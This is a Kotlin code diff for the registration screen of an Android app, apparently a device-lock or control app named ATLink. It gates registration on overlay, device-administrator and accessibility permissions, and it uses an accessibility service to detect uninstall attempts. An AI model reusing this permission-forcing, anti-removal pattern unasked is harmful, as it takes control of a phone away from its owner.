@@ -9,6 +9,8 @@ import android.os.Bundle
 import android.provider.Settings
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import android.accessibilityservice.AccessibilityService
+import android.text.TextUtils
 import com.android.volley.DefaultRetryPolicy
 import com.android.volley.Request
 import com.android.volley.toolbox.StringRequest
@@ -25,17 +27,24 @@ class RegistroActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
+        val safeContext = applicationContext.createDeviceProtectedStorageContext()
+        val prefs = safeContext.getSharedPreferences("CONFIG", MODE_PRIVATE)
+        val yaRegistrado = prefs.getBoolean("registro_completado", false)
+
+        if (yaRegistrado) {
+            finish()
+            return
+        }
+
         setContentView(R.layout.activity_registro)
 
-        // 1. Inicializar Vistas
         etNombreCliente = findViewById(R.id.etNombreCliente)
         btnVerContrato = findViewById(R.id.btnVerContrato)
         btnEnviar = findViewById(R.id.btnEnviarTodo)
 
-        // 2. Verificar permisos críticos de administración al entrar
         verificarPermisosEspeciales()
 
-        // 3. Configurar clics
         btnVerContrato.setOnClickListener {
             val intent = Intent(this, ContratoActivity::class.java)
             startActivity(intent)
@@ -54,10 +63,17 @@ class RegistroActivity : AppCompatActivity() {
             return
         }
 
+        // --- VALIDACIÓN EXTRA DE SEGURIDAD ---
+        // Si el usuario no activó los permisos, no lo dejamos enviar el registro
+        if (!Settings.canDrawOverlays(this) || !isAccessibilityServiceEnabled(this, DetectorDesinstalacion::class.java)) {
+            Toast.makeText(this, "⚠️ Debe activar todos los permisos de protección primero", Toast.LENGTH_LONG).show()
+            verificarPermisosEspeciales()
+            return
+        }
+
         btnEnviar.isEnabled = false
         btnEnviar.text = "REGISTRANDO..."
 
-        // Obtener el token de Firebase y enviar a Laravel
         FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
             if (task.isSuccessful) {
                 val token = task.result ?: ""
@@ -77,16 +93,15 @@ class RegistroActivity : AppCompatActivity() {
         val request = object : StringRequest(
             Request.Method.POST, url,
             { response ->
-                // Guardar que el dispositivo ya no está bloqueado tras el registro exitoso
                 val safeContext = applicationContext.createDeviceProtectedStorageContext()
                 safeContext.getSharedPreferences("CONFIG", MODE_PRIVATE)
-                    .edit().putBoolean("dispositivo_bloqueado", false).apply()
+                    .edit()
+                    .putBoolean("registro_completado", true)
+                    .putBoolean("dispositivo_bloqueado", false)
+                    .apply()
 
-                Toast.makeText(this, "✅ Registro exitoso", Toast.LENGTH_SHORT).show()
-
-                // Ir a la pantalla principal
-                startActivity(Intent(this, MainActivity::class.java))
-                finish()
+                Toast.makeText(this, "✅ Registro exitoso. Protección activada.", Toast.LENGTH_SHORT).show()
+                finishAffinity()
             },
             { error ->
                 btnEnviar.isEnabled = true
@@ -106,19 +121,19 @@ class RegistroActivity : AppCompatActivity() {
             }
         }
 
-        // 30 segundos de timeout para el registro
         request.retryPolicy = DefaultRetryPolicy(30000, 1, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT)
         queue.add(request)
     }
 
     private fun verificarPermisosEspeciales() {
-        // Permiso para mostrarse sobre otras apps
+        // 1. Superposición (Overlay)
         if (!Settings.canDrawOverlays(this)) {
             val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
             startActivity(intent)
+            return // Detenemos para que el usuario procese un permiso a la vez
         }
 
-        // Permiso de Administrador de Dispositivo
+        // 2. Administrador de Dispositivo
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
         if (!dpm.isAdminActive(adminComponent)) {
@@ -126,6 +141,37 @@ class RegistroActivity : AppCompatActivity() {
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Es necesario activar la protección para continuar.")
             startActivity(intent)
+            return
         }
+
+        // 3. Accesibilidad (Para detectar intentos de desinstalación)
+        if (!isAccessibilityServiceEnabled(this, DetectorDesinstalacion::class.java)) {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            startActivity(intent)
+            Toast.makeText(this, "Busca 'ATLink' y activa la Accesibilidad", Toast.LENGTH_LONG).show()
+        }
+    }
+
+    // Función auxiliar para verificar si el servicio está corriendo
+    private fun isAccessibilityServiceEnabled(context: Context, service: Class<out AccessibilityService>): Boolean {
+        val expectedId = ComponentName(context, service).flattenToString() // Usamos flattenToString para el ID completo
+        val enabledServices = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+
+        if (enabledServices.isNullOrEmpty()) return false
+
+        val colonSplitter = TextUtils.SimpleStringSplitter(':')
+        colonSplitter.setString(enabledServices)
+
+        while (colonSplitter.hasNext()) {
+            val componentName = colonSplitter.next()
+            // Comparamos ignorando mayúsculas/minúsculas
+            if (componentName.equals(expectedId, ignoreCase = true)) {
+                return true
+            }
+        }
+
+        // Verificación secundaria por si el ID se guardó de forma corta
+        val shortId = ComponentName(context, service).flattenToShortString()
+        return enabledServices.contains(shortId, ignoreCase = true)
     }
 }
